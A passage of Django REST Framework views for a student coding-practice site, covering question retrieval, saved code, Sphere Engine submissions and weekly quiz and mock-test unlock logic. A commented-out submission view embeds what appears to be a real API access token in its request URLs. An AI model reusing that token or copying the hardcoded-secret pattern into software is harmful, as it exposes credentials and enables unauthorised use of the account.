#                 if i.video_solutions is not None and len(i.video_solutions) != 0:
#                     try:
#                         vids = str(i.video_solutions).split("\r\n\r\n\r\n")
#                         vid_counter = 0
#                         for v in vids:
#                             vid_counter += 1
#                             vidd = str(v).replace("\r", "").replace("\n", "")
#                             nw_vids = vidd.split("||")
#                             vid_language = nw_vids[0]
#                             vid_url = nw_vids[1]
#                             all_videos.append({"video_title":vid_language,"video_links":vid_url})     
#                     except:
#                         all_videos.append({
#                                     "info":"Please follow The Process"
#                                 }) 
#                 approch_values = compiler_question_approches_practice(q_id) 
#                 prob_pic = i.prob_pic.url if i.prob_pic else "" 
#                 #add
#                 pre_code_list = SavePracticeCode.objects.filter(question_id=int(q_id), student_id= (std_id[0])).values("code_text") 
#                 if len(pre_code_list) == 0:
#                     pre_code = None
#                 else:
#                     pre_code = pre_code_list[0]["code_text"]
#                 main_data.append({"next_q_id":next_q_id,"course_name":get_course.course.name,"problem_id":i.prob_id,"question_id":i.id,"question_number":i.question_number,"question_name":i.ques_title,"socialSitList":socialSitList,"prob_text":i.prob_text,
#                                 "prob_pic":prob_pic,"examples":examples,"constrains":constrain,"const_pic":i.const_pic.url,"Challenge":i.challenge,"video_solutions":all_videos,"test_case": test_case_list ,"approch_values":approch_values, "pre_code":pre_code})
#             return Response({"main_data":main_data})
#         except Exception as e :
#             return Response({"error":f"{e}"})       


# class PracticeQuestionSearchTitel(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
#     def get(self, request, q_titel):
#         try :
#             main_data = []
#             q_titel = q_titel.replace("-", " ")
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             get_q = CompilerQuestion.objects.filter(ques_title=q_titel,practice_mock=False).order_by("question_number")
#             #next_questions
#             get_c_q = CompilerQuestion.objects.filter(ques_title=q_titel, practice_mock=False).values("week", "course_id", "id")
#             if len(get_c_q) != 0:
#                 week_id = int(get_c_q[0]["week"])
#                 course_id = int(get_c_q[0]["course_id"])
#                 get_q_all = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False).order_by("day")
#                 get_all_q_id = []
#                 loop_count = 4
#                 for k in range(1, loop_count):
#                     for_day = get_q_all.filter(day=k)
#                     for t in for_day:
#                         get_all_q_id.append(t.id)
#                 q_id = get_c_q[0]["id"]
#                 next_q_id = find_next_number(get_all_q_id.copy(), int(q_id))
#                 next_q_titel = CompilerQuestion.objects.filter(id=next_q_id, practice_mock=False).values("ques_title")[0]["ques_title"]
#             #end
#             get_course = CompilerQuestion.objects.get(ques_title=q_titel, practice_mock=False)
#             get_course.course.name if get_course.course else None
#             socialSitList = []
#             examples = []
#             test_case_list = []

#             for i in get_q :
#                 if i.google :
#                     socialSitList.append("Google") 
#                 if i.amazon :
#                     socialSitList.append("Amazon")
#                 if i.microsoft :
#                     socialSitList.append("Microsoft")
#                 if i.meta :
#                     socialSitList.append("Facebook")
#                 if i.linkedin :
#                     socialSitList.append("Linkedin")
#                 if i.uber :
#                     socialSitList.append("Uber")
#                 if i.adobe :
#                     socialSitList.append("Adobe")
#                 if i.cred :
#                     socialSitList.append("Cred")
                    
#                 #testcases
#                 if i.test_case is not None and len(i.test_case) != 0:
#                     if i.test_case != "null":
#                         try:
#                             test_case_txt = str(i.test_case).split("\r\n\r\n\r\n")
#                             t_counter = 0
#                             for case_ in test_case_txt:
#                                 t_counter += 1
#                                 caa = str(case_).replace("\r", "").replace("\n", "")
#                                 caaa = caa.split("||")
#                                 case_titel = caaa[0]
                                
#                                 # Split the parts and handle index out of range
#                                 test_case_parts = caaa[1].split("=")
#                                 test_case_titel = test_case_parts[0] + "=" if len(test_case_parts) > 1 else None
#                                 test_case_value = test_case_parts[1] if len(test_case_parts) > 1 else None

#                                 target_parts = caaa[2].split("=")
#                                 target_titel = target_parts[0] + "=" if len(target_parts) > 1 else None
#                                 target_value = target_parts[1] if len(target_parts) > 1 else None

#                                 expected_parts = caaa[3].split("=")
#                                 expected_titel = expected_parts[0] + "=" if len(expected_parts) > 1 else None
#                                 expected_value = expected_parts[1] if len(expected_parts) > 1 else None

#                                 test_case_list.append({
#                                     "id": t_counter,
#                                     "case_titel": case_titel,
#                                     "test_case_titel": test_case_titel,
#                                     "test_case_value": test_case_value,
#                                     "target_titel": target_titel,
#                                     "target_value": target_value,
#                                     "expected_titel": expected_titel,
#                                     "expected_value": expected_value
#                                 })
#                         except:
#                             test_case_list.append({
#                                     "info":"Please follow The Process"
#                                 })
#                 #examples
#                 try:
#                     exampless = str(i.examples)
#                     lines = exampless.strip().split('\n')
#                     exampless_list = []
#                     for line in lines:
#                         line = line.strip()  # Remove leading and trailing spaces
#                         if line.startswith("Sample Eg") and "||" in line:
#                             exampless_list.append(line)
#                     counter = 0
#                     for j in exampless_list:
#                         ex = str(j).replace("\r","").replace("\n","")
#                         exx = ex.split("||")
#                         title = exx[0]
#                         input = exx[1]
#                         output = exx[2]
#                         explanation = exx[3]
#                         examples.append({"id":counter+1,"title":title,"input":input,"output":output,"explanation":explanation})
#                         counter +=1
#                 except:
#                     pass
#                 # constrains
#                 constrain =[]    
#                 if i.constraints is not None and len(i.constraints) != 0:
#                     try:
#                         cons_txt = str(i.constraints).split("\r\n\r\n\r\n")
#                         con_counter = 0
#                         for con in cons_txt:
#                             con_counter += 1
#                             conss = str(con).replace("\r", "").replace("\n", "")
#                             nw_cons = conss.split("||")
#                             cons_title = nw_cons[0]
#                             cons_value = nw_cons[1]
#                             constrain.append({"constrain_title":cons_title,"constrain_value":cons_value})
#                     except:
#                         constrain.append({
#                                     "info":"Please follow The Process"
#                                 })         
#                 # video solutions
#                 all_videos =[]    
#                 if i.video_solutions is not None and len(i.video_solutions) != 0:
#                     try:
#                         vids = str(i.video_solutions).split("\r\n\r\n\r\n")
#                         vid_counter = 0
#                         for v in vids:
#                             vid_counter += 1
#                             vidd = str(v).replace("\r", "").replace("\n", "")
#                             nw_vids = vidd.split("||")
#                             vid_language = nw_vids[0]
#                             vid_url = nw_vids[1]
#                             all_videos.append({"video_title":vid_language,"video_links":vid_url})     
#                     except:
#                         all_videos.append({
#                                     "info":"Please follow The Process"
#                                 }) 
#                 approch_values = compiler_question_approches_practice(q_id) 
#                 prob_pic = i.prob_pic.url if i.prob_pic else "" 
#                 #add
#                 pre_code_list = SavePracticeCode.objects.filter(question_id=int(q_id), student_id= (std_id[0])).values("code_text") 
#                 if len(pre_code_list) == 0:
#                     pre_code = None
#                 else:
#                     pre_code = pre_code_list[0]["code_text"]
#                 main_data.append({"next_q_id":next_q_id,"next_q_titel":next_q_titel,"course_name":get_course.course.name,"problem_id":i.prob_id,"question_id":i.id,"question_number":i.question_number,"question_name":i.ques_title,"socialSitList":socialSitList,"prob_text":i.prob_text,
#                                 "prob_pic":prob_pic,"examples":examples,"constrains":constrain,"const_pic":i.const_pic.url,"Challenge":i.challenge,"video_solutions":all_videos,"test_case": test_case_list ,"approch_values":approch_values, "pre_code":pre_code})
#             return Response({"main_data":main_data})
#         except Exception as e :
#             return Response({"error":f"{e}"})       


# class StudentallPracticeLoadTemplate(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
#     def get(self,request):
#         try:
#             main_data = []
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             question_id = request.GET.get("question_id")
#             all_temp = CompilerQuestionLoadTemplate.objects.filter(question_id=question_id).order_by("compiler").values("id","compiler","load_template")
#             for i in all_temp:
#                 data_id = i["id"]
#                 compilers = str(i["compiler"]).split("||")
#                 compilers_name = compilers[0]
#                 compilers_id = compilers[1]
#                 have_code = SavePracticeCode.objects.filter(compliler_id = data_id, student_id = std_id[0], question_id = question_id).values("code_text")
#                 if have_code.exists():
#                     pre_code = have_code[0]["code_text"]
#                 else:
#                     pre_code = i["load_template"]
#                 main_data.append({"save_code_id":data_id, "compiler":i["compiler"],"compilers_name":compilers_name,"compilers_id":compilers_id,"load_template":pre_code})
#             return Response({"main_data":main_data})
#         except Exception as e :
#             return Response({"error":f"{e}"})


# class StudentPracticeSaveCode(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
    
#     def post(self, request) :
#         try :
#             user_id = request.user.id
#             std = Student.objects.filter(user_id=user_id).first()
#             q_id = request.data.get("q_id")
#             code = request.data.get("code")
#             compliler_id = request.data.get("compliler_id")
#             # print(q_id, code)
#             user_save_code = SavePracticeCode.objects.filter(student_id = std.id, question_id=q_id, compliler_id=int(compliler_id))
#             # print(user_save_code)
#             if user_save_code.exists():
#                 user_save_code.update(code_text=code)
#             else:
#                 user_save_code_craete = SavePracticeCode(student_id = std.id, question_id=q_id, compliler_id=int(compliler_id), code_text=code)
#                 user_save_code_craete.save()
#             return Response({"status":True,"compliler_id":int(compliler_id)})
#         except Exception as e :
#             return Response({"error":f"{e}"})


# class StudentallPracticeQuestionSubmission(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)
    
#     def post(self, request) :
#         try :
#             main_data = []
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             if len(std_id) > 0 :
#                 std_id = std_id[0]
#             else:
#                 std_id = ""
#             q_id = request.data.get("q_id")
#             source_code = request.data.get("source_code")
#             compiler = request.data.get("compiler")
#             compiler_id = request.data.get("compiler_id")
#             problem_id = request.data.get("problem_id")
#             coding_language = request.data.get("coding_language")
#             button_clicked = request.data.get("button_clicked")
#             get_q = CompilerQuestion.objects.filter(id=q_id,practice_mock=False)
#             if get_q.exists() and std_id !="" and source_code and compiler_id and problem_id and coding_language and button_clicked :
#                 get_q = get_q.first()
#                 check_temp = CompilerQuestionLoadTemplate.objects.filter(compiler=compiler)
#                 if check_temp.exists():
#                     get_temp = check_temp.first()
#                     load_template_id = get_temp.id
#                     coding_language = coding_language
#                 else:
#                     return Response({"main_data":main_data})
#                 attepmt_number = CompilerQuestionAtempt.objects.filter(question_id=q_id,student_id=std_id,load_template_id=load_template_id,
#                                                                     coding_language=coding_language,button_clicked="Run")
#                 if attepmt_number.exists():
#                     get_attepmt_number = len(attepmt_number)
#                     get_attepmt_temp = attepmt_number.first()
#                     get_attepmt_temp.attepmt_number = int(get_attepmt_number) + 1
#                     get_attepmt_temp.student_ans = source_code
#                     get_attepmt_temp.button_clicked = button_clicked
#                     get_attepmt_temp.save()
#                     main_data = get_attepmt_temp.id
#                 else:
#                     get_attepmt_number = 1
#                     get_attepmt_temp = CompilerQuestionAtempt(question_id=q_id,student_id=std_id,attepmt_number=get_attepmt_number,load_template_id=load_template_id,
#                                         coding_language=coding_language,student_ans=source_code,button_clicked=button_clicked)
#                     get_attepmt_temp.save()
#                     main_data = get_attepmt_temp.id
#             return Response({"main_data":main_data})
#         except Exception as e :
#             return Response({"error":f"{e}"})

# #new
# class StudentallPracticeQuestionSubmissionResponce(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)

#     def get(self, request):
#         try:
#             main_data = []
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             if len(std_id) > 0 :
#                 std_id = std_id[0]
#             else:
#                 std_id = ""
#             api_result = []
#             main_data_id = request.GET.get("main_data_id")
#             check_ans = CompilerQuestionAtempt.objects.filter(id=main_data_id)
#             if check_ans.exists():
#                 get_ans = check_ans.first()
#                 student_id = get_ans.student.id
#                 ques_id = get_ans.question.id
#                 previous_attempts = CompilerQuestionAtempt.objects.filter(question_id=ques_id,student_id=student_id,question__practice_mock=False).values("id","status","load_template__compiler","practic_time")
#                 source_code = get_ans.student_ans
#                 compiler = str(get_ans.load_template.compiler).split("||")
#                 compiler_id = compiler[1]
#                 problem_id = get_ans.question.prob_id
#                 url1 = 'https://31c7692b.problems.sphere-engine.com/api/v4/submissions?access_token=3d839c6883687fa7e1db43995c8d60c2'
#                 headers = {'Content-Type': 'application/json'}
#                 triple_quoted_string = '''{}'''.format(source_code)
#                 payload_for_post = {
#                     "compilerId": compiler_id,
#                     "source": triple_quoted_string,
#                     "problemId": problem_id
#                 }
#                 response = requests.post(url1, headers=headers, json=payload_for_post)
                
#                 if response.status_code == 201 :
#                     data = json.loads(response.text)

#                     get_sphere_engine_problems_id = data['id']
#                     time.sleep(3)
#                     url2 = f'https://31c7692b.problems.sphere-engine.com/api/v4/submissions?ids={get_sphere_engine_problems_id}&access_token=3d839c6883687fa7e1db43995c8d60c2'
#                     response2 = requests.get(url2)
#                     main_data = json.loads(response2.text)
#                     get_ans.code_response = response2.text
#                     get_ans.submissions_id = get_sphere_engine_problems_id
#                     # if code accepted
#                     res_ids = main_data['items'][0]['id']
#                     if main_data['items'][0]['result']['status']['name'] == "accepted" :
#                         url3 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/output?access_token=3d839c6883687fa7e1db43995c8d60c2"
#                         response3 = requests.get(url3)
#                         parsed_json = response3.text
#                         data_list = str(parsed_json).split("\n")
#                         dataset_index = data_list.index('DATASET NUMBER: 0')
#                         dataset_values = []
#                         for value in data_list[dataset_index + 1:]:
#                             if not value:
#                                 break
#                             dataset_values.append(value)
#                         dataset_values = [int(value) for value in dataset_values]
#                         api_result.append({
#                             "status":"accepted",
#                             "data":dataset_values       
#                             })
#                         get_ans.status = True
#                         get_ans.save()
#                     # if code compilation error
#                     elif main_data['items'][0]['result']['status']['name'] == "compilation error" :
#                         url4 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/cmpinfo?access_token=3d839c6883687fa7e1db43995c8d60c2"
#                         response4 = requests.get(url4)
#                         api_result.append({
#                             "status":"compilation error",
#                             "data":response4.text           
#                             })
#                     # if code wrong answer
#                     elif main_data['items'][0]['result']['status']['name'] == "wrong answer" :
#                         url5 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/error?access_token=3d839c6883687fa7e1db43995c8d60c2"
#                         response5 = requests.get(url5)
#                         api_result.append({
#                             "status":"wrong answer",
#                             "data":response5.text        
#                             })
#             return Response({"main_data":main_data,"source_code":"source_code","previous_attempts":previous_attempts, "api_result":api_result})
#         except Exception as e :
#             return Response({"error":f"{e}"})


class StudentDashboardQuizProgressBar(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try:
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            course_name_list = Course.objects.filter(id=course_id).values("name")
            if len(course_name_list) == 0:
                return Response({"message": 0, "error":f"No Course"}, status=status.HTTP_400_BAD_REQUEST)
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            batch_list = Batch.objects.filter(students__id = std_id[0], course_id=course_id).values()
            if len(batch_list) == 0:
                return Response({"message": 0, "error":f"No Batch"}, status=status.HTTP_400_BAD_REQUEST)
            else:
                batch = batch_list[0]["id"]
            # print(batch_list)
            time_table = list(TimeTable.objects.filter(batch_id = batch).values("start_date","start_time"))
            c_week = get_week_for_today(time_table)
            if c_week is None:
                c_week = 8
            total_score = 0
            for i in range(1, c_week+1):
                this_week_max_score_list = list(QuizAttempt.objects.filter(student_id__in=std_id, quiz__course_id=course_id, quiz__week__in=str(i)).values_list("score", flat=True))
                this_week_max_score = [int(score) for score in this_week_max_score_list]
                # print(f"------------------------------------week {i}", this_week_max_score)
                if len(this_week_max_score) == 0:
                    max_week_score = 0
                else:
                    max_week_score = max(this_week_max_score)
                total_score = int(total_score) + int(max_week_score)
            avg_score = total_score / c_week

            data = {
                "name": course_name_list[0]["name"], 
                "message": 1, 
                "start_date": batch_list[0]["start_date"],
                "end_date": batch_list[0]["end_date"],
                "avg_score": avg_score,
                "rem_score" : 100 - avg_score,
                "running week" : c_week
            }
            return Response(data, status=status.HTTP_200_OK)
        except Exception as e :
            return Response({"message": 0, "error":f"{e}"}, status=status.HTTP_400_BAD_REQUEST)
        
class StudentDashboardMockProgressBar(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try:
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            course_name_list = Course.objects.filter(id=course_id).values("name")
            if len(course_name_list) == 0:
                return Response({"message": 0, "error":f"No Course"}, status=status.HTTP_400_BAD_REQUEST)
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            batch_list = Batch.objects.filter(students__id = std_id[0], course_id=course_id).values()
            if len(batch_list) == 0:
                return Response({"message": 0, "error":f"No Batch"}, status=status.HTTP_400_BAD_REQUEST)
            else:
                batch = batch_list[0]["id"]
            # print(batch_list)
            time_table = list(TimeTable.objects.filter(batch_id = batch).values("start_date","start_time"))
            c_week = get_week_for_today(time_table)
            if c_week is None:
                c_week = 8
            total_score = 0
            for i in range(1, c_week+1):
                this_week_max_score = list(CompilerQuestionAtempt.objects.filter(student_id=std_id[0], question__practice_mock = True, question__course_id = course_id,  question__week=str(i)).values_list("score", flat=True))
                print(f"------------------------------------week {i}", this_week_max_score)
                if len(this_week_max_score) == 0:
                    max_week_score = 0
                else:
                    max_week_score = max(this_week_max_score)
                total_score = total_score + max_week_score
            print(total_score)
            avg_score = total_score / c_week

            data = {
                "name": course_name_list[0]["name"], 
                "message": 1, 
                "start_date": batch_list[0]["start_date"],
                "end_date": batch_list[0]["end_date"],
                "avg_score": avg_score,
                "rem_score" : 100 - avg_score,
                "running week" : c_week
            }
            return Response(data, status=status.HTTP_200_OK)
        except Exception as e :
            return Response({"message": 0, "error":f"{e}"}, status=status.HTTP_400_BAD_REQUEST)

        
class StudentDashboardQuizWeekContest(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try:
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id","batch__course_id")
            get_quiz = Quiz.objects.filter(course_id=course_id).values("id")
            get_quiz_id = [i["id"] for i in get_quiz]
            batch_ids = [i["batch_id"] for i in get_batch]
            all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids).values("week","start_date","start_time","batch__course__name").order_by("id")

            course_name = [i["batch__course__name"] for i in all_times]
            course_name = course_name[0] if len(course_name) > 0 else ""
            current_datetime = datetime.now()
            formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
            flg = []
            week_conut = []
            for i in all_times :
                if f"{i['start_date']}-{i['start_time']}" < formatted_datetime :
                    week_conut.append(i["week"])
            for i in range(1,9) :
                if  week_conut.count(str(i)) == 3 :
                    # This is for week 1
                    if str(i) == "1" :
                        get_stud_attempt = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id,quiz__week=str(i)).values("id","score")
                        get_week_questions_idss = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id,quiz__week=str(i)).values("id","quiz__id","questions__id")
                        get_time = QuestionTimer.objects.filter(exam_field="Quiz",week=str(i))
                        grouped_data = defaultdict(lambda: {"quiz__id": None, "questions__id": []})
                        for entry in get_week_questions_idss:
                            if grouped_data[entry["id"]]["quiz__id"] is None:
                                grouped_data[entry["id"]]["quiz__id"] = entry["quiz__id"]
                            grouped_data[entry["id"]]["questions__id"].append(entry["questions__id"])
                        result_list_w1 = [{"id": key, "quiz__id": value["quiz__id"], "questions__id": value["questions__id"]} for key, value in grouped_data.items()]
                        all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids , week=str(i)).values("week","start_date","start_time","batch__course__name","topic").order_by("id")
                        data=[]
                        if all_times:
                            first_quiz_info = {
                                'Topic_Name': all_times[2]['topic'],
                                'Start_date': all_times[2]['start_date'],
                                'Start_time': all_times[2]['start_time'],
                            }
                            data.append(first_quiz_info) 
                        if get_stud_attempt.exists():
                            previous_attempt = [int(attempt['score']) for attempt in get_stud_attempt]
                            max_score = max(previous_attempt, default=None)
                            get_time=get_time.first()
                            get_attempt = len(previous_attempt)
                            db_max_number = get_time.week_pass_percent
                            db_max_attempt = int(get_time.max_num_of_attempts)
                            if float(max_score) >= float(db_max_number) and get_attempt < db_max_attempt  :
                                flg.append({"id":i,"week": f"{i}","week_questions_ids":result_list_w1,"status": "Retake","condition":"","quiz_contest_details": data})
                            elif get_attempt < db_max_attempt :
                                flg.append({"id":i,"week": f"{i}","week_questions_ids":result_list_w1,"status": "Retake","condition":"","quiz_contest_details": data})
                            else:
                                flg.append({"id":i,"week": f"{i}","status":"","condition":"Attempted completed","quiz_contest_details": data})         
                        else:
                            flg.append({"id":i,"week": f"{i}","status": "Start now","condition":"","quiz_contest_details": data})
                
                    # for week 2,3,4,5,6,7,8
                    else:
                        wid = int(i) - 1
                        previous_attempt = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id,quiz__week=str(wid)).values("score")
                        get_time = QuestionTimer.objects.filter(exam_field="Quiz",week=str(wid))
                        current_attempt = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id,quiz__week=str(i)).values("score")
                        current_get_time = QuestionTimer.objects.filter(exam_field="Quiz",week=str(i))
                        c_week_questions_ids = QuizAttempt.objects.filter(student_id__in=std_id,quiz__course_id=course_id,quiz_id__in=get_quiz_id,quiz__week=str(i)).values("id","quiz__id","questions__id")
                        grouped_data = defaultdict(lambda: {"quiz__id": None, "questions__id": []})
                        for entry in c_week_questions_ids:
                            if grouped_data[entry["id"]]["quiz__id"] is None:
                                grouped_data[entry["id"]]["quiz__id"] = entry["quiz__id"]
                            grouped_data[entry["id"]]["questions__id"].append(entry["questions__id"])
                        c_result_list = [{"id": key, "quiz__id": value["quiz__id"], "questions__id": value["questions__id"]} for key, value in grouped_data.items()]
                        all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids , week=str(i)).values("week","start_date","start_time","batch__course__name","topic").order_by("id")
                        data=[]
                        if all_times:
                            first_quiz_info = {
                                'Topic_Name': all_times[2]['topic'],
                                'Start_date': all_times[2]['start_date'],
                                'Start_time': all_times[2]['start_time'],
                            }
                            data.append(first_quiz_info)
                        if current_attempt.exists():
                            current_attempt = [int(attempt['score']) for attempt in current_attempt]
                            max_score = max(current_attempt, default=None)
                            get_time=current_get_time.first()
                            get_attempt = len(current_attempt)
                            db_max_number = get_time.week_pass_percent
                            db_max_attempt = int(get_time.max_num_of_attempts)
                    
                            if float(max_score) >= float(db_max_number) and get_attempt < db_max_attempt :
                                flg.append({"id":i,"week": f"{i}","week_questions_ids":c_result_list,"status": "Retake","condition":"","quiz_contest_details": data})
                            else:
                                if get_attempt < db_max_attempt :
                                    flg.append({"id":i,"week": f"{i}","week_questions_ids":c_result_list,"status": "Retake","condition":"","quiz_contest_details": data})
                                else:
                                    flg.append({"id":i,"week": f"{i}","status":"","condition":"Attempted completed","quiz_contest_details": data})

                        elif previous_attempt.exists():
                            previous_attempt = [int(attempt['score']) for attempt in previous_attempt]
                            max_score = max(previous_attempt, default=None)
                            get_time=get_time.first()
                            db_max_number = get_time.week_pass_percent
                            db_max_attempt = int(get_time.max_num_of_attempts)
                            get_attempt = len(previous_attempt)
                            if float(max_score) >= float(db_max_number) and get_attempt == db_max_attempt  :
                                flg.append({"id":i,"week": f"{i}","status": "Start now","condition":"","quiz_contest_details": data})
                            else:
                                if get_attempt != db_max_attempt:
                                    flg.append({"id":i,"week": f"{i}","status": "Lock"})
                                else:
                                    flg.append({"id":i,"week": f"{i}","status": "Start now","condition":"","quiz_contest_details": data})
                        else:
                            flg.append({"id":i,"week": f"{i}","status": "Lock"})
                else:
                    flg.append({"id":i,"week": f"{i}","status": "Lock"})

            maindata = []
            for i in range(0, len(flg)):
                if flg[i]["status"] == "" or flg[i]["status"] == "Lock":
                    pass
                else:
                    maindata.append(flg[i])

            return Response({"course_name":course_name,"week":maindata}, status=status.HTTP_200_OK)  
          
        except Exception as e :
            return Response({"error":f"{e}"}) 

class StudentDashboardMockWeekContest(ListAPIView): 
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        try :
            user_id = request.user.id
            course_id = request.GET.get("course_id")
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id","batch__course_id")
            batch_ids = [i["batch_id"] for i in get_batch]
            current_datetime = datetime.now()
            formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
            flg = []
            week_conut = []
            all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids).values("week","start_date","start_time","batch__course__name").order_by("id")
            course_name = [i["batch__course__name"] for i in all_times]
            course_name = course_name[0] if len(course_name) > 0 else ""
            for i in all_times :
                if f"{i['start_date']}-{i['start_time']}" < formatted_datetime :
                    week_conut.append(i["week"])
            for i in range(1,9) :
                if  week_conut.count(str(i)) == 3 :
                    # This is for week 1
                    if str(i) == "1" :
                     
                        get_previous_attempt = CompilerQuestionAtempt.objects.filter(question__practice_mock = True, student_id__in = std_id , question__week__in = str(i)).values("id","question__id","question__ques_title","question__week","attepmt_number","score" )
                        get_time = QuestionTimer.objects.filter(exam_field="Mock",week=str(i))
                        grouped_data = defaultdict(list)
                        for entry in get_previous_attempt:
                            grouped_data[entry["id"]].append(entry["question__id"])
                        result_list_w1 = [{"id": key, "question__id": value} for key, value in grouped_data.items()]

                        all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids , week=str(i)).values("week","start_date","start_time","batch__course__name","topic").order_by("id")
                        data=[]
                        if all_times:
                            mock_info = {
                                'Topic_Name': all_times[2]['topic'],
                                'Start_date': all_times[2]['start_date'],
                                'Start_time': all_times[2]['start_time'],
                            }
                            data.append(mock_info) 
                        if get_previous_attempt.exists():
                            previous_attempts = [int(attempt['score']) for attempt in get_previous_attempt]
                            max_score = max(previous_attempts, default=None)
                            get_time=get_time.first()
                            get_attempt = len(previous_attempts)
                            db_max_number = get_time.week_pass_percent
                            db_max_attempt = int(get_time.max_num_of_attempts)
                            if float(max_score) >= float(db_max_number) and get_attempt < db_max_attempt :
                                flg.append({"id":i,"week": f"{i}","week_questions_ids":result_list_w1,"status": "Retake","mock_contest_details":data})
                            elif get_attempt < db_max_attempt :
                                flg.append({"id":i,"week": f"{i}","week_questions_ids":result_list_w1,"status": "Retake","condition":"","mock_contest_details": data})
                            else:
                                flg.append({"id":i,"week": f"{i}","week_questions_ids":result_list_w1,"status": "","condition":"Attempt Complete","mock_contest_details": data})         
                        else:
                            flg.append({"id":i,"week": f"{i}","status": "Start now","mock_contest_details":data})

                        # for week 2 to 8
                    else:
                        wid = int(i) 
                        widd = int(i) - 1
                        previous_attempt = CompilerQuestionAtempt.objects.filter(question__practice_mock = True, student_id__in = std_id , question__week__in = str(widd)).values("score" )
                        get_time = QuestionTimer.objects.filter(exam_field="Mock",week=str(widd))
                        current_attempt = CompilerQuestionAtempt.objects.filter(question__practice_mock = True, student_id__in = std_id , question__week__in = str(wid)).values("id","question__id","question__ques_title","question__week","attepmt_number","score")
                        current_get_time = QuestionTimer.objects.filter(exam_field="Mock",week=str(wid))
                        grouped_data = defaultdict(list)
                        for entry in current_attempt:
                            grouped_data[entry["id"]].append(entry["question__id"])
                        c_result_list = [{"id": key, "question__id": value} for key, value in grouped_data.items()]
                        all_times = TimeTable.objects.filter(batch__course_id=course_id,batch_id__in=batch_ids , week=str(i)).values("week","start_date","start_time","batch__course__name","topic").order_by("id")
                        data=[]
                        if all_times:
                            mock_info = {
                                'Topic_Name': all_times[2]['topic'],
                                'Start_date': all_times[2]['start_date'],
                                'Start_time': all_times[2]['start_time'],
                            }
                            data.append(mock_info)
                        if current_attempt.exists():
                            current_attempt = [int(attempt['score']) for attempt in current_attempt]
                            max_score = max(current_attempt, default=None)
                            get_time=current_get_time.first()
                            get_attempt = len(current_attempt)
                            db_max_number = get_time.week_pass_percent
                            db_max_attempt = int(get_time.max_num_of_attempts)
                            if float(max_score) >= float(db_max_number) and float(max_score) != float(db_max_number) and get_attempt < db_max_attempt :
                                flg.append({"id":i,"week": f"{i}","week_questions_ids":c_result_list,"status": "Retake","condition":"","mock_contest_details": data})
                            else:
                                if get_attempt < db_max_attempt :
                                    flg.append({"id":i,"week": f"{i}","week_questions_ids":c_result_list,"status": "Retake","condition":"","mock_contest_details": data})
                                else:
                                    flg.append({"id":i,"week": f"{i}","status": "","condition":"Attempt Complete","mock_contest_details": data})
                        
                        elif previous_attempt.exists():
                         
                            previous_attempt = [int(attempt['score']) for attempt in previous_attempt]
                            max_score = max(previous_attempt, default=None)
                            get_time=get_time.first()
                            db_max_number = get_time.week_pass_percent
                            db_max_attempt = int(get_time.max_num_of_attempts)
                            get_attempt = len(previous_attempt)
                            if float(max_score) >= float(db_max_number) and get_attempt == db_max_attempt : 
                                flg.append({"id":i,"week": f"{i}","status": "Start now","mock_contest_details": data})
                            else:   
                                flg.append({"id":i,"week": f"{i}","status": "Lock","mock_contest_details": data})
                        else:
                            flg.append({"id":i,"week": f"{i}","status": "Lock","mock_contest_details": data})           
                else:
                    flg.append({"id":i,"week": f"{i}","status": "Lock"})   

            maindata = []
            for i in range(0, len(flg)):
                if flg[i]["status"] == "":
                    pass
                elif flg[i]["status"] == "Lock":
                    maindata.append(flg[i]) 
                    return Response({"course_name":course_name,"unlock_data":maindata}, status=status.HTTP_200_OK) 
                else:
                    maindata.append(flg[i])
